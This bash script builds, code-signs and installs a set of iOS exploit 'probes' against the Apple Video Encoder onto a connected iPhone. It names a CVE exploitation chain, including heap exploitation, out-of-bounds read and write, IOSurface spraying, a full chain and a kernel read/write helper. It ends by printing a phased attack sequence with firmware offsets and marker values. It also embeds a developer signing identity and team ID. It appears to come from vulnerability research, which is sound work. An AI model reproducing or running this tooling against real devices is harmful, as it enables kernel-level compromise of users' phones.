#!/bin/bash
# deploy_all_probes.sh — Build and deploy all AVE research probes to device
# Usage: ./deploy_all_probes.sh [udid]
# If no UDID given, picks first USB device.

set -e

TEAM="9QP5427NJJ"
SIGN_ID="Apple Development: Travis Tameirao (7TJQC38PMP)"
DEST="$HOME/a20_research"
mkdir -p "$DEST"

UDID="${1:-$(pymobiledevice3 usbmux list --usb 2>/dev/null | python3 -c "import json,sys; d=json.load(sys.stdin); print(d[0]['UniqueDeviceID']) if d else sys.exit(1)" 2>/dev/null)}"
if [ -z "$UDID" ]; then echo "ERROR: No USB device found"; exit 1; fi
echo "Target UDID: $UDID"

# Priority probes (CVE-2026-114025 exploitation chain)
declare -a PROBES=(
    "AVEProbe114:com.research.aveprobe114:ave_114025_probe.c"
    "AVEHeapExploit:com.research.aveheap:ave_heap_exploit.c"
    "AVETwoSession:com.research.avetwosession:ave_two_session.c"
    "AVEPPSValueProbe:com.research.aveppsvalue:ave_pps_value_probe.c"
    "AVESelectiveOOB:com.research.aveselectoob:ave_selective_oob.c"
    "AVESubobjProbe:com.research.avesubobjprobe:ave_subobj_probe.c"
    "AVECounterOverflow:com.research.avecounteroverflow:ave_counter_overflow.c"
    "AVECrossBuffer:com.research.avecrossbuffer:ave_cross_buffer.c"
    "AVEFirmwareParamProbe:com.research.avefwparam:ave_firmware_param_probe.c"
    "AVEIOSurfSpray:com.research.aveiosurfspray:ave_iosurface_spray.c"
    "AVEOOBReadProbe:com.research.aveoobread:ave_oob_read_probe.c"
    "AVEFullChain:com.research.avefullchain:ave_full_chain.c"
    "KRWHelper:com.research.krwhelper:krw_helper.c"
)

build_and_deploy() {
    local name="$1" bundle="$2" src="$3"
    local appdir="$DEST/${name}.app"
    local binary="$DEST/$name"
    local entfile="$DEST/${name}.entitlements"

    echo ""
    echo "=== Building $name ($bundle) ==="

    # Build (add KRW_STANDALONE for krw_helper.c)
    local extra_flags=""
    if [[ "$src" == *"krw_helper.c"* ]]; then
        extra_flags="-DKRW_STANDALONE"
    fi
    xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
        -framework VideoToolbox -framework CoreVideo -framework CoreMedia \
        -framework CoreFoundation -framework IOSurface -framework IOKit \
        $extra_flags -o "$binary" "$src" -Wno-deprecated-declarations 2>&1
    if [ $? -ne 0 ]; then echo "BUILD FAILED: $name"; return 1; fi

    # Create .app bundle
    rm -rf "$appdir"
    mkdir -p "$appdir"
    cp "$binary" "$appdir/$name"

    # Info.plist
    cat > "$appdir/Info.plist" << PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key><string>$name</string>
    <key>CFBundleIdentifier</key><string>$bundle</string>
    <key>CFBundleName</key><string>$name</string>
    <key>CFBundleVersion</key><string>3.0</string>
    <key>CFBundleShortVersionString</key><string>3.0</string>
    <key>MinimumOSVersion</key><string>17.0</string>
    <key>CFBundlePackageType</key><string>APPL</string>
    <key>CFBundleSupportedPlatforms</key>
    <array><string>iPhoneOS</string></array>
    <key>UIDeviceFamily</key>
    <array><integer>1</integer><integer>2</integer></array>
</dict>
</plist>
PLIST

    # Entitlements
    cat > "$entfile" << ENT
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>application-identifier</key><string>${TEAM}.${bundle}</string>
    <key>com.apple.developer.team-identifier</key><string>${TEAM}</string>
    <key>get-task-allow</key><true/>
</dict>
</plist>
ENT

    # Sign
    codesign -f -s "$SIGN_ID" --entitlements "$entfile" "$appdir" 2>&1
    if [ $? -ne 0 ]; then echo "SIGN FAILED: $name"; return 1; fi

    # Install
    echo "Installing $name..."
    pymobiledevice3 apps install --udid "$UDID" "$appdir" 2>&1
    if [ $? -ne 0 ]; then echo "INSTALL FAILED: $name"; return 1; fi

    echo "OK: $name deployed"
    return 0
}

echo "============================================"
echo "  AVE Research Probe Deployment"
echo "  Device: $UDID"
echo "============================================"

OK=0 FAIL=0
for probe in "${PROBES[@]}"; do
    IFS=':' read -r name bundle src <<< "$probe"
    srcpath="$DEST/$src"
    if [ ! -f "$srcpath" ]; then
        echo "SKIP: $src not found at $srcpath"
        FAIL=$((FAIL+1))
        continue
    fi
    if build_and_deploy "$name" "$bundle" "$srcpath"; then
        OK=$((OK+1))
    else
        FAIL=$((FAIL+1))
    fi
done

echo ""
echo "============================================"
echo "  Deployment Complete: $OK ok, $FAIL failed"
echo "============================================"
echo ""
echo "PRIORITIZED test sequence for iPhone Duo (CVE-2026-114025):"
echo ""
echo "=== PHASE 1: MV-HEVC Support Verification ==="
echo "  1. pymobiledevice3 developer dvt launch $UDID com.research.avefwparam measure"
echo "     (Confirms MV-HEVC encoder works on this device)"
echo ""
echo "=== PHASE 2: Safe Baselines ==="
echo "  2. pymobiledevice3 developer dvt launch $UDID com.research.avecounteroverflow safe"
echo "     (50 encodes, within bounds — baseline behavior)"
echo "  3. pymobiledevice3 developer dvt launch $UDID com.research.aveppsvalue dump"
echo "     (Dump HEVC parameter set structure for NAL size measurement)"
echo ""
echo "=== PHASE 3: Counter Overflow (THE GATING TESTS) ==="
echo "  4. pymobiledevice3 developer dvt launch $UDID com.research.avecounteroverflow boundary"
echo "     (100 encodes — first OOB at ~86 encodes)"
echo "  5. pymobiledevice3 developer dvt launch $UDID com.research.avecounteroverflow deep"
echo "     (250 encodes — reaches firmware param array)"
echo ""
echo "=== PHASE 4: OOB Read (Info Leak) ==="
echo "  6. pymobiledevice3 developer dvt launch $UDID com.research.aveoobread multi"
echo "     (CVE-2026-112465: check if parameter readback leaks heap data)"
echo "  7. pymobiledevice3 developer dvt launch $UDID com.research.aveoobread overflow"
echo "     (300+ encodes then readback — full OOB read test)"
echo ""
echo "=== PHASE 5: Firmware Parameter Corruption ==="
echo "  8. pymobiledevice3 developer dvt launch $UDID com.research.avefwparam param_array"
echo "     (220 encodes with lid=0x4141 — targets +0x5C34-0x5F94)"
echo "  9. pymobiledevice3 developer dvt launch $UDID com.research.avefwparam w24_target"
echo "     (250 encodes with lid=0xBEEF — targets +0x6414 W24)"
echo ""
echo "=== PHASE 6: Cross-Buffer & Spray ==="
echo " 10. pymobiledevice3 developer dvt launch $UDID com.research.avecrossbuffer measure"
echo "     (Dump NAL sizes — determines cumsum growth rate)"
echo " 11. pymobiledevice3 developer dvt launch $UDID com.research.aveiosurfspray readback"
echo "     (Verify IOSurface property set/get works)"
echo " 12. pymobiledevice3 developer dvt launch $UDID com.research.aveiosurfspray spray_and_encode"
echo "     (Full attack: spray + encode + readback for corruption detection)"
